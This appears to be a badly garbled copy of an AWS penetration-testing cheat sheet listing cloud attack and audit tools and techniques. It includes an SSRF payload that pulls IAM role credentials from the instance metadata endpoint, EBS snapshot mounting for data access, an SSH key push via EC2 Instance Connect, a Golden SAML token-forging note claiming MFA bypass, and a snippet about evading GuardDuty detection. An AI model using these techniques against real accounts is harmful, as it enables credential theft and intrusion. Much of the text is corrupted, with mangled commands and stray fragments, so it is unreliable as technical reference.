# AWS 
[!]offers, reliable, scalable, inexpensive, cloud, .c, .srvc
## Summary
- [AWS](#aws)
  - [Summary](#summary)
  - [Training](#training)
...
$    ls
    ...
    ```
* [Bucket Finder](https://digi.ninja/projects/bucket_finder.php) - Search... 
for public/buckets, \list&\download.bat || if --dir db.indexing.domain.net/c is enabled
```powershell
...
*[Prowler](https://github.com/toniblyx/prowler) - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness
    > It follows guidelines of the CIS Amazon Web Services Foundations Benchmark, GDPR and HIPAA (+100).    
...
<>
    ...
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* [Principal Mapper](https://github.com/nccgroup/PMapper) - t o o l /for quickly evaluating IAM permissions in AWS
~
$ --git    https://github.com/nccgroup/PMapper
...
<>
    ...
    ```
<>
* [ScoutSuite](https://github.com/nccgroup/ScoutSuite/wiki) - xxxCloud-Sec_Audit\T o o l.c
~
    $ git clone https://github.com/nccgroup/ScoutSuite
    >>>import scout.py PROVIDER --help
    >>>--session-token option && for temp\cred (i.e. role assumption).
    ...
    `
<>
* [s3_objects_check](https://github.com/nccgroup/s3_objects_check) - Wh'ite_box\eval**effective-S3--object/permissions 民众。令牌。使用权。
~~
    ...
    ```
<>
* [cloudsplaining](https://github.com/salesforce/cloudsplaining) -AWS IAM SEC Assessment\tool identifies violations of least privilege and generates a risk-prioritized report
    $ pip3 install --user cloudsplaining
    $ cloudsplaining download --profile myawsprofile
    $ cloudsplaining scan --input-file default.json
    ``
<>
* [weirdAAL](https://github.com/carnal0wnage/weirdAAL/wiki) - AWS\att\lib
[!]
...
~
<>
* [cloudmapper](https://github.com/duo-labs/cloudmapper.git) - xMap --help \analyze Amazon Web Services (AWS) \env
~
$ git clone https://github.com/duo-labs/cloudmapper.git
$ sudo yum --install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli"build-essential"
$ sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli
$ pipenv install --skip-lock
$ pipenv shell
/ report: Generate HTML report. Include summary * accS & AudIt .[FIND]
\ iam_report: Generate HTML report for the IAM info\* acc..
/ audit: P0tential mis.config
< collect: --Collect \data.dat [ABOUT] acc.SQL
< find_admins::IAM policies...identify Admin\map 
<>~||==========`````````
>>>print(priveleges)

{void};
* [dufflebag](https://labs.bishopfox.com/dufflebag) - Find Secrets via leaked.Amazon.EBS’s“public”mode.js
Node.js
## AWS Patterns
| Service                                  | URL |
|-------------|--------|
...
.h
## AWS - \data.dat SSRP
> AWS released add.sec API.payload
...
3. Extract the roles temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/
    ```powershell
    {
    "Code" : "Success",
...
~
# AWS - Shadow Admin Admin equivalent permission 
<>
- AdministratorAccess
[!]
    ```powershell
...
[!]:warning: 
EBS :: snapshots are block-level incremental 
>snapshot -copy Block (or areas) in \vol \mod \last \snapshot. 
>Restore.dat (You) Create  New EBS \vol from [1] * (You) EBS snapshot 
$new\vol  xDuplicate * __init__EBS\vol [ON] snapshot
1. EC2 –> Volumes and create a new volume of your preferred size and type.
...
6. Format \vol ext4.file using the following command : `sudo mkfs -t ext4 /dev/xvdf`
7. Create \dir * --mount  \ext4\new\vol.IAM using Name “newvolume” : `sudo mkdir /newvolume`
8. Mount \vol "newvolume" dir using the following command : `sudo mount /dev/xvdf /newvolume/`
9. cd into newvolume dir * C:\disk\space for confirming \vol --mount : `cd /newvolume; df -h .`
## AWS - Copy EC2 use AMI Img
[1] 
$ (You) -extract .dat About (c)urrent InstancEs *  AMI/security groups/subnet :: `aws ec2 describe-images --region eu-west-1`
```powershell
[!] create new\img for instance-id
...
$AWS -InstanceConnect-PushSSHkeyEC2instance
>>>import sec-group*sub.net --connect -easy [MODE]:
```powershell
...
$ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-
$ user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds
...
[!]::warning::ssm-userAcc =/= -rm from sys | SSM Agent  --uninstal
...
$ -git https://www.youtube.com/watch?v=5dj4vOqqGZw    
$ -git https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/
> use extract info tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without the knowledge of end-userSpswrd...This attack also bypasses any MFA requirements. 
Require:
...
if 'kali' in ua.lower() or 'parrot' in ua.lower() or 'pentoo' in ua.lower():  # If the local OS is Kali/Parrot/Pentoo Linux
    # GuardDuty triggers a finding around API calls made from Kali Linux
    self.print(Detected environment as one of Kali/Parrot/Pentoo Linux.) ["MOD", "END", "USER", "AGENT"] from GuardDuty...
```
## DynamoDB
> Amazon DynamoDB is key-value and .doc .dat xbase delivers single-digit millisecond performance at any scale.
[!] fully managed, multi-region, multi-active, durable db, built-in, sec, backup, restore, in-memory, caching for internet-scale appS... $ DynamoDB --handle [+] > [1000000000000] -request [24] * 1.0  \\support peaks * > [20000000] -request * 0.1 
